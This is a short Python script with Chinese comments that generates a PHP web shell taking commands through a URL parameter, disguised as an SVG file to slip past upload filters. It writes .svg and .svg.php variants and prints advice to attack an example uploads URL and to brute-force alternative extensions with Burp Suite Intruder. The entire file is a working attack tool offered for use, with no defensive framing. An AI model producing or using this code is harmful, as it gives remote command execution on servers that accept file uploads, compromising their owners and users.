from io import BytesIO

# PHP 内容（phpinfo）
php_content = '''
<?php 
system($_GET["cmd"]);
 ?>
'''

# SVG 文件的魔术数字（文件头）
svg_magic_number = '''<?xml version="1.0" encoding="UTF-8" standalone="no"?>\n'''

# 创建一个包含 PHP 代码的 .svg 文件的函数
def create_php_to_svg_with_magic_number():
    # 创建一个内存中的字节缓冲区
    f = BytesIO()
    
    # 写入 SVG 文件的魔术数字
    f.write(svg_magic_number.encode('utf-8'))
    
    # 将 PHP 内容作为注释写入缓冲区
    f.write(f'<!--\n{php_content}\n-->'.encode('utf-8'))  # 将 PHP 内容放入注释中
    
    # 将缓冲区位置重置为起始位置
    f.seek(0)
    
    return f

# 创建内存中的 PHP .svg 文件
php_svg_file = create_php_to_svg_with_magic_number()

# 保存为 php 扩展名的文件
with open('phpinfo2.svg.php', 'wb') as output_file:
    output_file.write(php_svg_file.read())

# 重新创建字节缓冲区以保存为 svg 扩展名的文件
php_svg_file = create_php_to_svg_with_magic_number()

# 保存为 .svg 扩展名的文件
with open('phpinfo2.svg', 'wb') as output_file:
    output_file.write(php_svg_file.read())

# 打印信息
print("文件 'phpinfo2.svg' 和 'phpinfo2.svg.php' 成功创建，内容为 PHP 代码且带有 SVG 魔术数字！\n")
print("可以使用 http://example.com/uploads/phpinfo2.svg.php 进行攻击\n")
print("如果失败，使用 Burp Suite 的 Intruder 工具进行测试，尝试不同的扩展名，例如 phpinfo2.svg.phar。\n")
print("通过 Intruder 可以设置 payload 位置并替换文件扩展名，自动化尝试常见漏洞扩展名。\n")
